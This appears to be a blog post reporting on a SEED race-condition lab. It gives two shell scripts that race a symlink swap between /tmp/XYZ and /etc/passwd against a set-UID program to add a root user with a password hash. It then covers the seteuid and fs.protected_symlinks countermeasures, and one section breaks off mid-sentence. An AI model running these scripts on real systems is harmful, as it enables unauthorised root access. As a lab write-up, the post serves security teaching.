@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    Race-Condition | Simon&#39;s Blog
+  </title>
+  <meta name="description" content="I am the storm.">
+  
+  <meta name="keywords" content="
+  SEED Lab,Race Condition
+  ">
+  
+  <meta name="author" content="Simon Nie">
+
+  <meta http-equiv="Cache-Control" content="no-transform"/>
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="https://github.githubassets.com/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet"
+        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">Google Search</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        
+        <li><a href="/categories">Categories</a></li>
+        
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+        <li class="desktop-only"><a href="/atom.xml" target="_blank">RSS</a></li>
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.jpg"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 23 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 101 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 9 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">Simon&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    Simon Nie
+
+    <span class="post-date float-right" title="{{moment(1579882191000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1579882191000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>Race-Condition</h1>
+    <p><img src="Race-Condition/Platform-SEEDUbuntu16__04--32bit-green.svg" alt="">  <img src="Race-Condition/SEED-SoftwareSecurityLab-brightgreen.svg" alt=""></p>
+<blockquote>
+<p>This is report of SEED Lab report.</p>
+</blockquote>
+<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
+<li><a href="#task-1-choosing-our-target">Task 1: Choosing Our Target</a></li>
+<li><a href="#task-2-launching-the-race-condition-attack">Task 2: Launching the Race Condition Attack</a></li>
+<li><a href="#task-3-countermeasure-applying-the-principle-of-least-privilege">Task 3 Countermeasure: Applying the Principle of Least Privilege</a></li>
+<li><a href="#task-4-countermeasure-using-ubuntus-built-in-scheme">Task 4: Countermeasure: Using Ubuntu’s Built-in Scheme</a></li>
+<li><a href="#about-fsprotected_symlinks">About fs.protected_symlinks</a></li>
+<li><a href="#test-with-fsprotected_symlinks1">Test with fs.protected_symlinks=1</a><ul>
+<li><a href="#实验原理">实验原理:</a></li>
+</ul>
+</li>
+<li><a href="#official-reference">Official reference</a></li>
+</ul>
+<h2 id="Task-1-Choosing-Our-Target"><a href="#Task-1-Choosing-Our-Target" class="headerlink" title="Task 1: Choosing Our Target"></a>Task 1: Choosing Our Target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=0</span></span><br></pre></td></tr></table></figure>
+
+<p>Get the <code>vulp.c</code>  and compile it.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ta</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 4755 vulp</span></span><br></pre></td></tr></table></figure>
+
+<p>Analyze the program. Since it is set-UID program, it’s eUID is 0. Then it can overwrite any file. When it wants to modify some file, the program will check whether it has the privilege to do so. Hence there is a short time slice between it accessing the privilege and write the file. If we change the target file it wants to write, then we can overwrite some important file.</p>
+<p>Our target is to add a root user, <code>test</code>, into the <code>/etc/passwd</code>.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:U6aMy0wojraho:0:0:test:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>After test, we can find that if we add content above to <code>/etc/passwd</code>, then we can login test as root user.</p>
+<p>So our target is to create a symbol link to <code>/etc/passwd</code>.</p>
+<h2 id="Task-2-Launching-the-Race-Condition-Attack"><a href="#Task-2-Launching-the-Race-Condition-Attack" class="headerlink" title="Task 2: Launching the Race Condition Attack"></a>Task 2: Launching the Race Condition Attack</h2><p>We need run two scripts parallel.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> attack.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">CHECK_FILE="ls -l /etc/passwd"</span><br><span class="line">old=$($CHECK_FILE)</span><br><span class="line">new=$($CHECK_FILE)</span><br><span class="line">while [ "$old" == "$new" ]</span><br><span class="line">do</span><br><span class="line">ln -sf /home/seed/Documents/SoftwareSecurity/raceCondition/tmp /tmp/XYZ</span><br><span class="line">ln -sf /etc/passwd /tmp/XYZ</span><br><span class="line">new=$($CHECK_FILE)</span><br><span class="line">done</span><br><span class="line">echo "STOP... The passwd file has been changed"</span><br></pre></td></tr></table></figure>
+
+<p>Another script:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> check.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">CHECK_FILE="ls -l /etc/passwd"</span><br><span class="line">old=$($CHECK_FILE)</span><br><span class="line">new=$($CHECK_FILE)</span><br><span class="line">while [ "$old" == "$new" ]</span><br><span class="line">do</span><br><span class="line">./vulp &lt; passwd_input</span><br><span class="line">new=$($CHECK_FILE)</span><br><span class="line">done</span><br><span class="line">echo "STOP... The passwd file has been changed"</span><br></pre></td></tr></table></figure>
+
+<p>Before attack, ensure that the <code>/tmp/XYZ</code> does not exist and the <code>password_input</code> has been created.</p>
+<p>then run two scripts you can find it succeeded.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo bash attack.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo bash check.sh</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task-3-Countermeasure-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-Countermeasure-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3 Countermeasure: Applying the Principle of Least Privilege"></a>Task 3 Countermeasure: Applying the Principle of Least Privilege</h2><p>The fundamental problem of the vulnerable program in this lab is the violation of the Principle of Least Privilege.  The programmer does understand that the user who runs the program might be too powerful, so he/she introduced <code>access()</code>to limit the user’s power. However, this is not the proper approach. A better approach is to apply the Principle of Least Privilege;  namely,  if users do not need certain privilege,  the privilege needs to be disabled. We can use set-euid system call to temporarily disable the root privilege, and later enable it if necessary. Please use this approach to fix the vulnerability in the program, and then repeat your attack. Will you be able to succeed? Please report your observations and provide explanation.</p>
+<p>Change the program like below, then compile and attack using this program again. We can find it failed. That is because the <code>seteuid()</code> function introduced a code segment where <code>access()</code> and <code>open()</code> would share the same privilege, so the try would fail.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vulp.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * fn = <span class="string">"/tmp/XYZ"</span>;</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">60</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="comment">/* get user input */</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%50s"</span>, <span class="built_in">buffer</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uid_t</span> e_uid = geteuid(); <span class="comment">//new add</span></span><br><span class="line">	seteuid(getuid()); <span class="comment">//new add</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!access(fn, W_OK))&#123; </span><br><span class="line">		fp = fopen(fn, <span class="string">"a+"</span>); </span><br><span class="line">		fwrite(<span class="string">"\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">		fwrite(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">strlen</span>(<span class="built_in">buffer</span>), fp);</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"No permission \n"</span>);</span><br><span class="line">	seteuid(e_uid); <span class="comment">//new add</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-4-Countermeasure-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-4-Countermeasure-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="Task 4: Countermeasure: Using Ubuntu’s Built-in Scheme"></a>Task 4: Countermeasure: Using Ubuntu’s Built-in Scheme</h2><p>Ubuntu 10.10 and later come with a built-in protection scheme against race condition attacks.  In this task,you need to turn the protection back on using the following commands:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w kernel.yama.protected_sticky_symlinks=1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=1</span></span><br></pre></td></tr></table></figure>
+
+<p>Conduct your attack after the protection is turned on.  Please describe your observations.  Please also explain the followings:  </p>
+<p>(1) How does this protection scheme work?  </p>
+<p>(2) What are the limitations of this scheme?</p>
+<p>It will failed, but the details why this scheme would work is still not clear enough.</p>
+<h2 id="About-fs-protected-symlinks"><a href="#About-fs-protected-symlinks" class="headerlink" title="About fs.protected_symlinks"></a>About <code>fs.protected_symlinks</code></h2><p>= 0 means no limitation about normal users creating soft links.</p>
+<p>=1 means only when the UID of the target equals to the soft link or the</p>
+<h2 id="Test-with-fs-protected-symlinks-1"><a href="#Test-with-fs-protected-symlinks-1" class="headerlink" title="Test with fs.protected_symlinks=1"></a>Test with <code>fs.protected_symlinks=1</code></h2><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理:"></a>实验原理:</h3><blockquote>
+<h5 id="Official-reference"><a href="#Official-reference" class="headerlink" title="Official reference"></a>Official reference</h5><p>A long-standing class of security issues is the symlink-based time-of-check-time-of-use race, most commonly seen in world-writable directories like /tmp. The common method of exploitation of this flaw is to cross privilege boundaries when following a given symlink (i.e. a root process follows a symlink belonging to another user). For a likely incomplete list of hundreds of examples across the years, please see: <a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=/tmp" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=/tmp</a></p>
+<p>When set to “0”, symlink following behavior is unrestricted.</p>
+<p>When set to “1” symlinks are permitted to be followed <strong>only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.</strong></p>
+<p>This protection is based on the restrictions in Openwall and grsecurity.</p>
+</blockquote>
+<p>重点:</p>
+<p>When set to “1” symlinks are permitted to be followed <strong>only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.</strong></p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="http://simonnie98.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 Simon Nie</li>
+      <li><a href="http://simonnie98.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/SimonNie98" target="_blank" rel="noopener">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica" target="_blank" rel="noopener">Replica</a>
+      by <a href="//github.com/sabrinaluo" target="_blank" rel="noopener">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '001135385136731589458:hwqr0dnpaxv';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
